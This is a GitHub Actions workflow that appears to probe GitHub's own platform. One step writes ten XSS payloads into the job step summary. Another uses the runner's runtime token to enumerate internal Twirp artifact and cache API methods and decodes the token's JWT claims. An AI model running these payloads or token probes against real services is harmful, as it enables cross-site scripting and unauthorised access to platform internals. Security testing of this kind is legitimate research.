name: Artifact Scope + Summary XSS Test
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Step Summary XSS Probe
        run: |
          # Write XSS payloads to GITHUB_STEP_SUMMARY
          cat >> "$GITHUB_STEP_SUMMARY" << 'EOF'
          ## Summary XSS Probe
          
          Test 1: <img src=x onerror=alert(document.domain)>
          Test 2: <script>alert(1)</script>
          Test 3: <svg onload=alert(1)>
          Test 4: [link](javascript:alert(1))
          Test 5: <details open ontoggle=alert(1)><summary>click</summary>test</details>
          Test 6: <iframe src="javascript:alert(1)">
          Test 7: <a href="javascript:void(0)" onclick="alert(1)">click</a>
          Test 8: <math><maction actiontype="statusline" xlink:href="javascript:alert(1)">click</maction></math>
          Test 9: <input onfocus=alert(1) autofocus>
          Test 10: <marquee onstart=alert(1)>
          EOF
          echo "Step summary written with 10 XSS probes"

      - name: Artifact Twirp API Probe
        uses: actions/github-script@v7
        with:
          script: |
            const env = process.env;
            const resultsUrl = env.ACTIONS_RESULTS_URL;
            const token = env.ACTIONS_RUNTIME_TOKEN;
            
            if (!resultsUrl || !token) {
              console.log('Missing env vars');
              return;
            }
            
            const headers = {
              'Authorization': `Bearer ${token}`,
              'Content-Type': 'application/json'
            };
            
            // Check what artifact services exist at ACTIONS_RESULTS_URL
            console.log('=== Artifact service discovery ===');
            
            // Try the artifact twirp service
            const services = [
              'github.actions.results.api.v1.ArtifactService',
              'github.actions.results.api.v1.CacheService',
              'github.actions.results.api.v2.ArtifactService',
            ];
            
            for (const svc of services) {
              const methods = ['CreateArtifact', 'ListArtifacts', 'GetSignedArtifactURL', 'FinalizeArtifact'];
              for (const method of methods) {
                const url = `${resultsUrl}twirp/${svc}/${method}`;
                try {
                  const resp = await fetch(url, {
                    method: 'POST', headers,
                    body: JSON.stringify({})
                  });
                  const text = await resp.text();
                  if (resp.status !== 404) {
                    console.log(`${svc}/${method}: ${resp.status} ${text.substring(0, 100)}`);
                  }
                } catch(e) {
                  // skip
                }
              }
            }
            
            // Also check the workflow run backend ID from the token
            try {
              const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
              console.log(`\nOwn repo_id: ${payload.repository_id}`);
              console.log(`Own orch_id: ${payload.orch_id}`);
              console.log(`Own run_id: ${payload.run_id}`);
              console.log(`Own job_id: ${payload.job_id}`);
            } catch(e) {
              console.log('JWT decode error:', e.message);
            }
